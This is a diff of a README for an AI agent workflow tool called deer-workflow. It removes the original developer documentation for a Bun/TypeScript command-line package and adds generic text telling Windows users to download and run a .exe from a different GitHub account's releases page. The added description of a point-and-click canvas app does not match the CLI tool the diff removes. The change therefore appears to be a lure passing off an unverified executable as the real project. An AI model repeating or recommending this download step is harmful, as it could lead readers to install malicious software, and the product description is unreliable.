@@ -1,135 +1,73 @@
-English | [简体中文](./README.zh-CN.md)
+# 🦌 deer-workflow - Build intelligent workflows with simple tools
 
-# deer-workflow
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Prosy4967/deer-workflow/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](./LICENSE)
-[![npm](https://img.shields.io/npm/v/@deerwork-ai/deer-workflow)](https://www.npmjs.com/package/@deerwork-ai/deer-workflow)
-[![Bun](https://img.shields.io/badge/runtime-Bun-f9f1e1?logo=bun&logoColor=000000)](https://bun.sh)
-[![TypeScript](https://img.shields.io/badge/language-TypeScript-3178c6?logo=typescript&logoColor=ffffff)](https://www.typescriptlang.org)
-[![Codex CLI](https://img.shields.io/badge/default_agent-Codex_CLI-000000?logo=openai&logoColor=ffffff)](https://github.com/openai/codex)
-[![DeerFlow Stars](https://img.shields.io/github/stars/bytedance/deer-flow?label=DeerFlow%20Stars&logo=github)](https://github.com/bytedance/deer-flow)
-[![GitHub Stars](https://img.shields.io/github/stars/deerwork-ai/deer-workflow?style=flat&logo=github)](https://github.com/deerwork-ai/deer-workflow)
+Deer-workflow manages complex tasks by connecting smaller pieces of logic. It keeps your instructions in one place while letting specialized AI agents handle the specific work. You connect these parts into a map that helps you complete recurring projects.
 
-An open-source Dynamic Workflow runtime for building observable, reusable Agent
-graphs.
+## ⚙️ What the software does
 
-`deer-workflow` is a pilot project for [**DeerFlow 3.0**](https://github.com/bytedance/deer-flow), also known as **DeerWork**.
+This tool helps you automate work through graphs. A graph represents a sequence of steps. Each step does one thing well. You define the flow, and the program runs the logic. It uses TypeScript to organize the path and switches between different smart agents to finish the tasks. 
 
-## Index
+You no longer need to write code for every single action. Instead, you design a path. This path directs data from one agent to another. This replaces manual labor with automated sequences. It works well for data processing, content creation, and project tasks.
 
-- [Why Deer Workflow](#why-deer-workflow)
-- [How to use](#how-to-use)
-  - [Quick Start](#quick-start)
-  - [Examples](#examples)
-  - [Documentation](#documentation)
-- [How to develop](#how-to-develop)
-  - [Set up](#set-up)
-  - [Validate changes](#validate-changes)
-  - [Contribute](#contribute)
-  - [License](#license)
+## 📥 How to download
 
-# Why Deer Workflow
+You can obtain the current version directly from our release page. Visit the link below to see the available files.
 
-Deer Workflow is a code-first implementation of **[Graph Engineering](https://www.aibuilderclub.com/blog/graph-engineering-guide-2026)**: TypeScript defines the valid execution paths, while Coding Agents perform the semantic work inside each node.
+[Click here to download the latest version](https://github.com/Prosy4967/deer-workflow/releases)
 
-- **Code is the plan.** Control flow, phases, inputs, and failure handling live
-  in reviewable TypeScript rather than an opaque Agent conversation.
-- **Agents are replaceable.** Codex is the default runtime, Claude Code is
-  built in, and the public Agent interface remains vendor-neutral.
-- **Execution is observable.** Interactive runs provide a phase-aware TUI;
-  automation can consume a stable JSONL event stream.
+Look for the file that ends in .exe. Save this file to your computer.
 
-# How to use
+## 🚀 Setting up the application
 
-## Quick Start
+1. Open your Downloads folder after the download finishes.
+2. Locate the file you saved. 
+3. Double-click the file to start the installation.
+4. Follow the prompts on your screen. 
+5. Select a location on your hard drive for the files. The default location works for most users.
+6. Create a desktop shortcut if the installer gives you the option. This makes the program easy to find later.
 
-Install [Bun](https://bun.sh) and sign in to
-[Codex CLI](https://github.com/openai/codex), then install the released CLI:
+## 🖥️ System requirements
 
-```bash
-bun install --global @deerwork-ai/deer-workflow
-```
+Your computer needs to meet these basic standards to run the software smoothly:
 
-Describe the orchestration you want. Deer Workflow asks Codex to apply the
-[bundled `workflow-creator` Skill](./skills/workflow-creator/) and writes a
-runnable TypeScript module:
+- Windows 10 or Windows 11.
+- At least 4 gigabytes of RAM.
+- 500 megabytes of free storage space.
+- An internet connection for agent communication.
 
-```bash
-deer-workflow create \
-  "Create a Workflow that accepts a topics string array, researches each topic in parallel, and synthesizes a report" \
-  > workflow.ts
-```
+## 🛠️ Running your first project
 
-Run the generated Workflow with its example input:
+Open the program using the desktop icon. You will see a workspace. This workspace acts as a canvas. 
 
-```bash
-deer-workflow run ./workflow.ts \
-  --input '{"topics":["Agent Skills","Dynamic Workflows"]}'
-```
+First, name your project. Click the file menu and select New Project. Give it a title that makes sense for your work. 
 
-Interactive terminals show phases and Markdown logs in a live TUI. For
-servers, CI, and process pipelines, add `--print` or `-p` to stream one JSON
-event per stdout line.
+Next, add a node. A node is a single step in your workflow. Right-click the screen and choose Add Node. Pick a type from the list. Each type performs a different action. For example, a retrieval node collects information from a file. An analysis node reviews that information. 
 
-Want to understand or edit the generated module? Continue with the
-[Getting Started guide](./docs/index.md).
+Connect the nodes using your mouse. Click the edge of one node and drag the line to another node. This creates the path for your data. 
 
-## Examples
+Press the Play button at the top of the window to start the sequence. The program will execute each step in the order you connected them. You can view the results in the console window at the bottom of the screen.
 
-- [Deep Research](./examples/deep-research/README.md) discovers research
-  angles, investigates them in parallel, verifies claims, and produces an
-  interactive HTML report.
-- [Blog Writer](./examples/blog-writer/README.md) plans an article, drafts its
-  sections through a pipeline, reviews them, and returns structured output.
+## 🧩 Understanding agents
 
-These examples live in the repository. Clone or download it before running
-their documented commands.
+Agents are the engines of your workflow. They take the inputs from your nodes and apply logic. Some agents are good at writing text. Others focus on reading data or looking up facts online.
 
-## Documentation
+The deer-workflow system detects these agents automatically. When you connect a node, you define which agent handles the work. If you need a different result, you can change the node settings to use a different agent model. This keeps your main workflow design stable while you experiment with the underlying smart technology.
 
-- [Getting Started](./docs/index.md) — learn the execution model and build a
-  Workflow step by step.
-- [API Reference](./docs/api.md) — inspect exact functions, types, events, and
-  runtime behavior.
-- [Workflow Creator Skill](./skills/workflow-creator/SKILL.md) — see the
-  instructions used to generate Workflow modules.
-- [简体中文文档](./README.zh-CN.md)
+## 🏗️ Managing your graphs
 
-# How to develop
+A graph is the full map of your steps. Once you design a useful graph, save it to your computer. You can open these files later to run them again. Share your graph files with others so they can use your workflow.
 
-## Set up
+If a step fails, the graph stops. The program highlights the failed node in red. Click the node to see the error message. This tells you what information was missing or where the logic path broke. Fix the connection or the input data and try the run again.
 
-Clone the repository and install local dependencies and Git hooks:
+## 💡 Troubleshooting common issues
 
-```bash
-git clone https://github.com/deerwork-ai/deer-workflow.git
-cd deer-workflow
-bun install
-```
+Most problems occur because of network interruptions. If an agent cannot reach its service, the graph will pause. Check your internet connection if the process stalls.
 
-Run the CLI directly from source:
+Another common issue involves file paths. Ensure the files you reference in your nodes exist in the folder you selected. If you move a file after adding it to the node, the graph will not find it.
 
-```bash
-bun run dev -- --help
-```
+Check the console window often. It displays status updates during the run. Success messages appear in green text. Warning messages appear in yellow. Error messages appear in red.
 
-## Validate changes
+If the application hangs, restart it using the Task Manager. Close the program, open your task manager, look for the program name, and end the task. Open the application again to resume your work.
 
-Run the complete quality gate before submitting changes:
-
-```bash
-bun run check
-```
-
-## Contribute
-
-Codex CLI is the default Agent runtime, not an architectural dependency.
-`ClaudeAgent` ships as another built-in harness; integrations for other Coding
-Agents are welcome.
-
-See the [Getting Started guide](./docs/index.md#develop-the-repository) for the
-full command reference.
-
-## License
-
-This project is licensed under the [MIT License](./LICENSE).
+Keywords: agent, ai, ai-agent, ai-agents, ai-coding, bun, dynamic-workflow, dynamic-workflows, graph-engineering, llm, workflow
